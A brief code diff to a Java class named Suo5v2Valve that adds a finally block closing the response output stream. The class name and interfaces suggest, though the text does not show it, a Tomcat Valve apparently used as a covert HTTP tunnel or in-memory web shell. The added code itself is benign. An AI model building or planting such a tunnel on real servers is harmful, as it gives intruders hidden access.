@@ -167,7 +167,11 @@ public class Suo5v2Valve implements Valve, Runnable, HostnameVerifier, X509Trust
             }
         } catch (Throwable e) {
         } finally {
-
+            try {
+                OutputStream out = resp.getOutputStream();
+                out.flush();
+                out.close();
+            } catch (Throwable ignored) {}
         }
     }
 
